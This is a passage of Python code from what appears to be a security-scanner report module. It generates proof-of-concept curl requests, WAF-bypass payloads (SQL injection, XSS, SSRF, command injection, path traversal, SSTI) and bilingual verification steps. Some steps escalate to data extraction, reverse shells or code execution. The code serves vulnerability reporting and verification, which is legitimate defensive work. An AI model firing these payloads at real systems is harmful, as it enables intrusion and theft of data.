            f"{p}={encoded if p == first_param else 'test'}"
            for p in param_names[:3]
        )
        lines.append(
            f"curl -X GET 'http://<target>{target_path}?{get_params}'"
        )

    # Add alternate payload variant
    lines.append("")
    if lang == "cn":
        lines.append("# 备选 payload（绕过简单 WAF/过滤）：")
    else:
        lines.append("# Alternate payload (bypass simple WAF/filters):")
    alt_payload = _alternate_payload(cwe_id, vuln_type, payload)
    if alt_payload and alt_payload != payload:
        alt_encoded = _url_encode_payload(alt_payload)
        if method in ("POST", "PUT", "PATCH"):
            lines.append(
                f"curl -X {method} 'http://<target>{target_path}' \\\n"
                f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                f"  -d '{first_param}={alt_encoded}'"
            )
        else:
            lines.append(
                f"curl -X GET 'http://<target>{target_path}?{first_param}={alt_encoded}'"
            )
    else:
        # URL-encode variant
        if method in ("POST", "PUT", "PATCH"):
            lines.append(
                f"# Same as above but double-URL-encoded:\n"
                f"# curl -X {method} 'http://<target>{target_path}' \\\n"
                f"#   -d '{first_param}={_url_encode_payload(encoded)}'"
            )
        else:
            lines.append(
                f"# Same as above but double-URL-encoded:\n"
                f"# curl -X GET 'http://<target>{target_path}?{first_param}={_url_encode_payload(encoded)}'"
            )

    # Add expected result note
    lines.append("")
    if lang == "cn":
        lines.append("# 预期结果: 见报告中的 '利用步骤 → 观察响应' 部分")
    else:
        lines.append("# Expected result: see 'Exploitation Steps → Observe' in report")

    return "\n".join(lines)


def _infer_endpoint(file_path: str, vuln_type: str, cwe_id: str) -> str:
    """Infer a plausible HTTP endpoint from file path and vuln type."""
    if not file_path:
        return "/api/endpoint"

    # Remove extension and common prefixes
    path = file_path.replace("\\", "/")
    for prefix in ("src/", "app/", "api/", "controllers/", "routes/", "handlers/"):
        if prefix in path:
            path = path[path.index(prefix) + len(prefix):]
    for ext in (".py", ".js", ".java", ".php", ".ts", ".go"):
        path = path.replace(ext, "")

    # Convert path segments to URL segments
    segments = [s for s in path.split("/") if s and s not in ("__init__", "index", "main")]
    if not segments:
        return "/api/endpoint"

    # Build URL from path segments
    url = "/" + "/".join(segments)

    # Append a plausible action based on vuln type
    vt = vuln_type.lower()
    if "sql" in vt:
        url += "/search"
    elif "xss" in vt:
        url += "/comment"
    elif "ssrf" in vt:
        url += "/fetch"
    elif "command" in vt:
        url += "/exec"
    elif "path" in vt or "traversal" in vt:
        url += "/download"
    elif "deserial" in vt:
        url += "/import"
    elif "ssti" in vt:
        url += "/preview"
    elif "auth" in vt or "idor" in vt:
        url += "/profile"
    elif "redirect" in vt:
        url += "/redirect"

    return url


def _infer_http_method(vuln_type: str, cwe_id: str, code_snippet: str) -> str:
    """Infer the likely HTTP method from code patterns."""
    code_lower = code_snippet.lower()

    # Check code for HTTP method hints
    if "post" in code_lower or "doPost" in code_lower:
        return "POST"
    if "put" in code_lower or "doPut" in code_lower:
        return "PUT"
    if "delete" in code_lower or "doDelete" in code_lower:
        return "DELETE"
    if "get" in code_lower or "doGet" in code_lower:
        return "GET"
    if "request.get" in code_lower or "request.args" in code_lower or "req.query" in code_lower:
        return "GET"
    if "request.form" in code_lower or "request.post" in code_lower or "req.body" in code_lower:
        return "POST"

    # Vuln-type based defaults
    vt = vuln_type.lower()
    if vt in ("sql_injection", "xss", "ssrf", "command_injection"):
        return "GET"  # These are commonly in GET params
    if vt in ("deserialization", "xxe", "ssti"):
        return "POST"  # These are commonly in POST bodies
    return "GET"


def _resolve_param_names(
    http_params: str,
    var_names: list[str],
    code_snippet: str,
    vuln_type: str,
) -> list[str]:
    """Resolve concrete parameter names for the PoC.

    Precedence:
    1. http_params from the finding (most reliable — from framework extraction)
    2. Variable names extracted from code snippet
    3. Vuln-type-based defaults
    """
    # 1. Use explicit HTTP params
    if http_params:
        params = [p.strip() for p in http_params.split(",") if p.strip()]
        if params:
            return params

    # 2. Use variable names from code
    if var_names:
        return var_names

    # 3. Vuln-type defaults
    vt = vuln_type.lower()
    if "sql" in vt:
        return ["id", "query", "search"]
    if "xss" in vt:
        return ["name", "comment", "message"]
    if "ssrf" in vt:
        return ["url", "target", "redirect_uri"]
    if "command" in vt:
        return ["cmd", "host", "ip"]
    if "path" in vt or "traversal" in vt:
        return ["file", "path", "filename"]
    if "deserial" in vt:
        return ["data", "payload"]
    if "ssti" in vt:
        return ["template", "content", "name"]
    if "auth" in vt:
        return ["token", "user_id", "role"]
    return ["input", "param"]


def _alternate_payload(cwe_id: str, vuln_type: str, original: str) -> str:
    """Provide an alternate payload to bypass simple filtering."""
    if "CWE-89" in (cwe_id or "") or "sql" in vuln_type.lower():
        return "1' OR 1=1 --"
    if "CWE-79" in (cwe_id or "") or "xss" in vuln_type.lower():
        return "<img src=x onerror=alert(1)>"
    if "CWE-918" in (cwe_id or "") or "ssrf" in vuln_type.lower():
        return "http://127.0.0.1:8080/admin"
    if "CWE-78" in (cwe_id or "") or "command" in vuln_type.lower():
        return "| id"
    if "CWE-22" in (cwe_id or "") or "path" in vuln_type.lower():
        return "....//....//etc/passwd"
    if "CWE-502" in (cwe_id or "") or "deserial" in vuln_type.lower():
        return "rO0ABXNyABNqYXZhLnV0aWwuSGFzaE1hcA..."
    if "CWE-1336" in (cwe_id or "") or "ssti" in vuln_type.lower():
        return "${7*7}"
    return ""


def _add_cn_vuln_explanation(
    lines: list[str],
    cwe_id: str,
    vuln_type: str,
    code_snippet: str,
    var_names: list[str],
    payload: str,
    source_location: str,
    sink_location: str,
) -> None:
    """Add Chinese vulnerability explanation to PoC lines."""
    vt = vuln_type.lower()

    if "sql" in vt or "CWE-89" in (cwe_id or ""):
        _explain_sqli_cn(lines, code_snippet, var_names, payload)
    elif "xss" in vt or "CWE-79" in (cwe_id or ""):
        _explain_xss_cn(lines, code_snippet, var_names, payload)
    elif "ssrf" in vt or "CWE-918" in (cwe_id or ""):
        _explain_ssrf_cn(lines, code_snippet, var_names, payload)
    elif "command" in vt or "injection" in vt or "CWE-78" in (cwe_id or ""):
        _explain_cmdi_cn(lines, code_snippet, var_names, payload)
    elif "path" in vt or "traversal" in vt or "CWE-22" in (cwe_id or ""):
        _explain_path_traversal_cn(lines, code_snippet, var_names, payload)
    elif "deserial" in vt or "CWE-502" in (cwe_id or ""):
        _explain_deser_cn(lines, code_snippet, var_names, payload)
    elif "ssti" in vt or "CWE-1336" in (cwe_id or ""):
        _explain_ssti_cn(lines, code_snippet, var_names, payload)
    else:
        _explain_generic_cn(lines, code_snippet, var_names, payload,
                            source_location, sink_location)


def _add_en_vuln_explanation(
    lines: list[str],
    cwe_id: str,
    vuln_type: str,
    code_snippet: str,
    var_names: list[str],
    payload: str,
    source_location: str,
    sink_location: str,
) -> None:
    """Add English vulnerability explanation to PoC lines."""
    vt = vuln_type.lower()

    if "sql" in vt or "CWE-89" in (cwe_id or ""):
        _explain_sqli_en(lines, code_snippet, var_names, payload)
    elif "xss" in vt or "CWE-79" in (cwe_id or ""):
        _explain_xss_en(lines, code_snippet, var_names, payload)
    elif "ssrf" in vt or "CWE-918" in (cwe_id or ""):
        _explain_ssrf_en(lines, code_snippet, var_names, payload)
    elif "command" in vt or "injection" in vt or "CWE-78" in (cwe_id or ""):
        _explain_cmdi_en(lines, code_snippet, var_names, payload)
    elif "path" in vt or "traversal" in vt or "CWE-22" in (cwe_id or ""):
        _explain_path_traversal_en(lines, code_snippet, var_names, payload)
    elif "deserial" in vt or "CWE-502" in (cwe_id or ""):
        _explain_deser_en(lines, code_snippet, var_names, payload)
    elif "ssti" in vt or "CWE-1336" in (cwe_id or ""):
        _explain_ssti_en(lines, code_snippet, var_names, payload)
    else:
        _explain_generic_en(lines, code_snippet, var_names, payload,
                            source_location, sink_location)


# ── Per-vuln-type explanation helpers (Chinese) ──────────────────────────

def _explain_sqli_cn(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    """Analyze code for SQL injection patterns and explain specifically."""
    has_concat = "+" in code or "format" in code or "f\"" in code or "f'" in code or "%" in code
    has_execute = "execute" in code or "cursor" in code or "raw" in code
    var_names_str = ", ".join(vars_[:3]) if vars_ else "用户输入"

    lines.append("# 漏洞机制分析：")
    if has_concat and has_execute:
        lines.append(f"#   代码使用字符串拼接/格式化将 `{var_names_str}` 直接嵌入 SQL 查询，")
        lines.append("#   然后通过 execute/raw 方法执行，绕过了参数化查询保护。")
    elif has_concat:
        lines.append(f"#   代码使用字符串拼接将 `{var_names_str}` 嵌入 SQL 语句，")
        lines.append("#   未使用参数化查询（PreparedStatement / ? 占位符）。")
    elif has_execute:
        lines.append(f"#   代码直接使用 `{var_names_str}` 构造 SQL 并执行，")
        lines.append("#   未对输入进行任何过滤或参数化处理。")
    else:
        lines.append(f"#   用户输入 `{var_names_str}` 未经过滤即传入 SQL 查询构建逻辑。")
    lines.append("#")
    lines.append("# 验证步骤：")
    lines.append(f"# 1. 将 payload `{payload}` 注入到输入参数中")
    lines.append("# 2. 发送请求，观察响应中是否包含异常数据或数据库错误")
    lines.append("# 3. 如确认注入，可升级为 UNION SELECT 提取敏感数据")


def _explain_xss_cn(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "用户输入"
    has_escape = "escape" in code or "sanitize" in code or "html" in code
    has_render = (
        "innerHTML" in code or "dangerously" in code
        or "| safe" in code or "Markup" in code
    )

    lines.append("# 漏洞机制分析：")
    if has_render:
        lines.append("#   代码使用不安全的渲染方式（如 innerHTML/dangerouslySetInnerHTML/|safe）")
        lines.append(f"#   将 `{var_names_str}` 直接输出到 HTML 页面。")
    elif has_escape:
        lines.append("#   代码中虽然存在转义逻辑，但转义不完整或可被绕过。")
    else:
        lines.append(f"#   `{var_names_str}` 未经 HTML 实体编码即嵌入页面输出。")
    lines.append("#")
    lines.append("# 验证步骤：")
    lines.append(f"# 1. 将 payload `{payload}` 提交到输入点")
    lines.append("# 2. 检查页面是否弹出 alert 对话框")
    lines.append("# 3. 查看页面源码确认 payload 未被转义（< 未变成 &lt;）")


def _explain_ssrf_cn(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "用户输入的 URL"
    has_fetch = "fetch" in code or "request" in code or "urlopen" in code or "http" in code.lower()
    has_validate = "validate" in code or "whitelist" in code or "allow" in code

    lines.append("# 漏洞机制分析：")
    if has_fetch and not has_validate:
        lines.append(f"#   代码直接使用 `{var_names_str}` 发起服务端 HTTP 请求，")
        lines.append("#   未对目标 URL 进行白名单校验或域名限制。")
    elif has_fetch:
        lines.append("#   代码虽然存在 URL 校验，但校验逻辑可被绕过")
        lines.append("#   （如使用 URL 重定向、DNS rebinding、IPv6 表示等方式）。")
    else:
        lines.append(f"#   `{var_names_str}` 被用于构造服务端请求的目标地址。")
    lines.append("#")
    lines.append("# 验证步骤：")
    lines.append(f"# 1. 将目标 URL 替换为 {payload}")
    lines.append("# 2. 检查响应中是否包含内部服务的返回内容")
    lines.append("# 3. 尝试访问云元数据服务（AWS 169.254.169.254 等）")


def _explain_cmdi_cn(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "用户输入"
    has_shell = (
        "system" in code or "exec" in code or "subprocess" in code
        or "popen" in code or "Runtime" in code
    )
    has_shell_true = "shell=True" in code or "shell = true" in code.lower()

    lines.append("# 漏洞机制分析：")
    if has_shell_true:
        lines.append(
            f"#   代码使用 shell=True 模式执行命令，"
            f"`{var_names_str}` 被拼接到命令字符串中。"
        )
        lines.append("#   shell 元字符（; | && $() ``）未被过滤，攻击者可注入额外命令。")
    elif has_shell:
        lines.append(f"#   代码将 `{var_names_str}` 传递给系统命令执行函数，")
        lines.append("#   未使用参数列表形式（应使用数组传递参数，而非字符串拼接）。")
    else:
        lines.append(f"#   `{var_names_str}` 被用于构造系统命令。")
    lines.append("#")
    lines.append("# 验证步骤：")
    lines.append(f"# 1. 在输入中追加 `{payload}`")
    lines.append("# 2. 检查响应中是否包含命令执行结果（如 /etc/passwd 内容）")
    lines.append("# 3. 尝试建立反向 shell 或 DNS 外带确认命令执行")


def _explain_path_traversal_cn(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "用户输入"
    has_open = "open" in code or "read" in code or "file" in code or "Path" in code
    has_join = "join" in code or "+" in code or "os.path" in code

    lines.append("# 漏洞机制分析：")
    if has_join and has_open:
        lines.append(f"#   代码将 `{var_names_str}` 与基础路径拼接后直接打开文件，")
        lines.append("#   未调用 os.path.realpath()/Path.resolve() 对路径进行规范化验证。")
    elif has_open:
        lines.append(f"#   代码直接使用 `{var_names_str}` 打开文件，未限制在允许的目录范围内。")
    else:
        lines.append(f"#   `{var_names_str}` 被用于构造文件系统路径。")
    lines.append("#")
    lines.append("# 验证步骤：")
    lines.append(f"# 1. 将路径参数替换为 `{payload}`")
    lines.append("# 2. 检查是否成功读取到 /etc/passwd 或其他敏感文件")
    lines.append("# 3. 尝试使用绝对路径或 URL 编码绕过简单过滤")


def _explain_deser_cn(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "用户输入"
    has_pickle = "pickle" in code or "unpickle" in code or "loads" in code
    has_yaml = "yaml.load" in code and "SafeLoader" not in code
    has_java_deser = "readObject" in code or "ObjectInputStream" in code

    lines.append("# 漏洞机制分析：")
    if has_pickle:
        lines.append(f"#   代码使用 pickle.loads() 反序列化 `{var_names_str}`，")
        lines.append("#   pickle 的 __reduce__ 方法可被利用执行任意 Python 代码。")
    elif has_yaml:
        lines.append(f"#   代码使用 yaml.load()（非 SafeLoader）解析 `{var_names_str}`，")
        lines.append("#   可构造 !!python/object 标签触发任意代码执行。")
    elif has_java_deser:
        lines.append(f"#   代码使用 ObjectInputStream.readObject() 反序列化 `{var_names_str}`，")
        lines.append("#   classpath 中可能存在可利用的 gadget chain。")
    else:
        lines.append(f"#   `{var_names_str}` 被传入反序列化函数，未验证数据来源。")
    lines.append("#")
    lines.append("# 验证步骤：")
    lines.append(f"# 1. 使用 {payload}")
    lines.append("# 2. 观察应用是否崩溃、执行命令或产生异常行为")
    lines.append("# 3. 如为 Java，使用 ysoserial 生成 gadget chain payload")


def _explain_ssti_cn(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "用户输入"
    has_render = "render" in code or "template" in code or "jinja" in code.lower()

    lines.append("# 漏洞机制分析：")
    if has_render:
        lines.append(f"#   代码将 `{var_names_str}` 直接传递给模板渲染函数，")
        lines.append("#   用户输入被当作模板表达式执行而非纯文本处理。")
    else:
        lines.append(f"#   `{var_names_str}` 被用于服务端模板渲染。")
    lines.append("#")
    lines.append("# 验证步骤：")
    lines.append(f"# 1. 提交 payload `{payload}`")
    lines.append("# 2. 如果输出 49，说明表达式被执行，确认 SSTI 存在")
    lines.append("# 3. 升级为 RCE payload（如 Jinja2 的 __class__.__mro__ 链）")


def _explain_generic_cn(
    lines: list[str], code: str, vars_: list[str], payload: str,
    source: str, sink: str,
) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "用户输入"
    lines.append("# 漏洞机制分析：")
    if source and sink:
        lines.append(f"#   用户可控数据从 `{source}` 流向 `{sink}`，")
        lines.append("#   中间缺少有效的输入验证和输出过滤。")
    elif vars_:
        lines.append(f"#   `{var_names_str}` 接收用户输入后未经过滤，")
        lines.append("#   直接传递给危险操作。")
    else:
        lines.append("#   用户输入未经过滤即到达敏感操作。")
    lines.append("#")
    lines.append("# 验证步骤：")
    lines.append(f"# 1. 构造恶意输入 `{payload}`")
    lines.append("# 2. 提交到受影响的功能端点")
    lines.append("# 3. 观察响应，确认是否存在异常行为或敏感数据泄露")


# ── Per-vuln-type explanation helpers (English) ──────────────────────────

def _explain_sqli_en(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    has_concat = "+" in code or "format" in code or "f\"" in code or "f'" in code or "%" in code
    has_execute = "execute" in code or "cursor" in code or "raw" in code
    var_names_str = ", ".join(vars_[:3]) if vars_ else "user input"

    lines.append("# Vulnerability mechanism:")
    if has_concat and has_execute:
        lines.append(f"#   Code concatenates/formats `{var_names_str}` directly into SQL queries")
        lines.append("#   and executes via execute/raw — bypassing parameterized query protection.")
    elif has_concat:
        lines.append(f"#   Code uses string concatenation to embed `{var_names_str}` in SQL,")
        lines.append("#   without parameterized queries (PreparedStatement / ? placeholders).")
    elif has_execute:
        lines.append(f"#   Code constructs SQL with `{var_names_str}` directly,")
        lines.append("#   without any input filtering or parameterization.")
    else:
        lines.append(f"#   `{var_names_str}` flows into SQL query construction unfiltered.")
    lines.append("#")
    lines.append("# Verification:")
    lines.append(f"# 1. Inject `{payload}` into the input parameter")
    lines.append("# 2. Check the response for anomalous data or database errors")
    lines.append("# 3. If confirmed, escalate to UNION SELECT for data extraction")


def _explain_xss_en(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "user input"
    has_render = "innerHTML" in code or "dangerously" in code or "| safe" in code

    lines.append("# Vulnerability mechanism:")
    if has_render:
        lines.append("#   Code uses unsafe rendering (innerHTML/dangerouslySetInnerHTML/|safe)")
        lines.append(f"#   to output `{var_names_str}` directly into the HTML page.")
    else:
        lines.append(f"#   `{var_names_str}` is embedded in page output without HTML encoding.")
    lines.append("#")
    lines.append("# Verification:")
    lines.append(f"# 1. Submit `{payload}` to the input point")
    lines.append("# 2. Check if an alert dialog appears in the browser")
    lines.append("# 3. Verify the payload is not escaped in page source")


def _explain_ssrf_en(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "user-supplied URL"
    has_fetch = "fetch" in code or "request" in code or "urlopen" in code

    lines.append("# Vulnerability mechanism:")
    if has_fetch:
        lines.append(f"#   Code uses `{var_names_str}` to make server-side HTTP requests")
        lines.append("#   without URL whitelisting or domain restrictions.")
    else:
        lines.append(
            f"#   `{var_names_str}` is used to construct the target "
            f"of a server-side request."
        )
    lines.append("#")
    lines.append("# Verification:")
    lines.append(f"# 1. Replace the target URL with {payload}")
    lines.append("# 2. Check if internal service content appears in the response")
    lines.append("# 3. Try accessing cloud metadata endpoints (AWS 169.254.169.254, etc.)")


def _explain_cmdi_en(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "user input"
    has_shell_true = "shell=True" in code or "shell = true" in code.lower()

    lines.append("# Vulnerability mechanism:")
    if has_shell_true:
        lines.append(f"#   Code executes commands with shell=True, `{var_names_str}` is")
        lines.append(
            "#   concatenated into the command string. "
            "Shell metacharacters are unfiltered."
        )
    else:
        lines.append(f"#   `{var_names_str}` is passed to a system command execution function.")
    lines.append("#")
    lines.append("# Verification:")
    lines.append(f"# 1. Append `{payload}` to the input")
    lines.append("# 2. Check for command output in the response")
    lines.append("# 3. Attempt reverse shell or DNS exfiltration to confirm execution")


def _explain_path_traversal_en(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "user input"
    has_join = "join" in code or "+" in code or "os.path" in code

    lines.append("# Vulnerability mechanism:")
    if has_join:
        lines.append(f"#   Code joins `{var_names_str}` with a base path and opens the result,")
        lines.append(
            "#   without calling os.path.realpath()/Path.resolve() "
            "for path normalization."
        )
    else:
        lines.append(f"#   `{var_names_str}` is used to construct a filesystem path.")
    lines.append("#")
    lines.append("# Verification:")
    lines.append(f"# 1. Replace the path parameter with `{payload}`")
    lines.append("# 2. Check if /etc/passwd or other sensitive files are readable")
    lines.append("# 3. Try absolute paths or URL encoding to bypass simple filters")


def _explain_deser_en(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "user input"
    has_pickle = "pickle" in code or "loads" in code

    lines.append("# Vulnerability mechanism:")
    if has_pickle:
        lines.append(f"#   Code uses pickle.loads() to deserialize `{var_names_str}` —")
        lines.append(
            "#   pickle's __reduce__ can be exploited for "
            "arbitrary Python code execution."
        )
    else:
        lines.append(
            f"#   `{var_names_str}` is passed to a deserialization "
            f"function from an untrusted source."
        )
    lines.append("#")
    lines.append("# Verification:")
    lines.append(f"# 1. Use {payload}")
    lines.append("# 2. Observe whether the app crashes, executes commands, or behaves abnormally")
    lines.append("# 3. For Java, use ysoserial to generate a gadget chain payload")


def _explain_ssti_en(lines: list[str], code: str, vars_: list[str], payload: str) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "user input"
    has_render = "render" in code or "template" in code

    lines.append("# Vulnerability mechanism:")
    if has_render:
        lines.append(
            f"#   Code passes `{var_names_str}` directly to "
            f"a template rendering function —"
        )
        lines.append("#   user input is evaluated as a template expression, not plain text.")
    else:
        lines.append(f"#   `{var_names_str}` is used in server-side template rendering.")
    lines.append("#")
    lines.append("# Verification:")
    lines.append(f"# 1. Submit `{payload}`")
    lines.append("# 2. If the output is 49, the expression was executed — SSTI confirmed")
    lines.append("# 3. Escalate to RCE (e.g., Jinja2 __class__.__mro__ chain)")


def _explain_generic_en(
    lines: list[str], code: str, vars_: list[str], payload: str,
    source: str, sink: str,
) -> None:
    var_names_str = ", ".join(vars_[:3]) if vars_ else "user input"
    lines.append("# Vulnerability mechanism:")
    if source and sink:
        lines.append(f"#   User-controlled data flows from `{source}` to `{sink}`")
        lines.append("#   without sufficient input validation or output filtering.")
    elif vars_:
        lines.append(f"#   `{var_names_str}` receives user input and passes it unfiltered")
        lines.append("#   to a dangerous operation.")
    else:
        lines.append("#   User input reaches a sensitive operation without filtering.")
    lines.append("#")
    lines.append("# Verification:")
    lines.append(f"# 1. Craft malicious input: `{payload}`")
    lines.append("# 2. Submit to the affected endpoint")
    lines.append("# 3. Observe the response for anomalous behavior or data leakage")


def _get_verify_items(cwe_id: str, lang: str = "cn") -> list[str]:
    """Return the verification indicator items for step 3 of exploitation."""
    labels = _L[lang]

    if "CWE-89" in (cwe_id or ""):
        return labels["verify_sql"]
    if "CWE-79" in (cwe_id or ""):
        return labels["verify_xss"]
    if "CWE-918" in (cwe_id or ""):
        return labels["verify_ssrf"]
    if "CWE-78" in (cwe_id or "") or "CWE-77" in (cwe_id or ""):
        return labels["verify_cmd"]
    if "CWE-22" in (cwe_id or ""):
        return labels["verify_path_traversal"]
    if "CWE-502" in (cwe_id or ""):
        return labels["verify_deser"]
    return labels["verify_default"]


# ═══════════════════════════════════════════════════════════════════════════
# SARIF helpers
# ═══════════════════════════════════════════════════════════════════════════


def _sarif_level(severity: str) -> str:
    """Map HyqAgent severity to SARIF `result.level`."""
    return {
        "critical": "error",
        "high": "error",
        "medium": "warning",
        "low": "note",
    }.get(severity, "warning")


def _severity_score(severity: str) -> float:
    """Map severity string to the 0-10 `security-severity` float."""
    return {
        "critical": 9.5,
        "high": 7.5,
        "medium": 5.0,
        "low": 2.5,
    }.get(severity, 5.0)
